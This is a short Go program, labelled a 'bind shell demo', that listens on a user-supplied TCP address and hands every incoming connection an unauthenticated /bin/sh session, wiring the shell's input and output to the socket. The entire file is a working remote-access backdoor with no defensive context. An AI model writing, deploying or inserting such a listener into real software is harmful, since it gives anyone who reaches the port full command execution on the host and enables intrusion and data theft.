package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

func main() {
	var addr string
	if len(os.Args) != 2 {
		fmt.Println("Usage: " + os.Args[0] + " <bindAddress>")
		fmt.Println("Example: " + os.Args[0] + " 0.0.0.0:9999")
		os.Exit(1)
	}

	addr = os.Args[1]

	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatal("Error connecting. ", err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("accepting connection err: ", err)
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	var shell = "/bin/sh"
	_, _ = conn.Write([]byte("bind shell demo\n"))
	command := exec.Command(shell)
	command.Env = os.Environ()
	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	_ = command.Run()
}
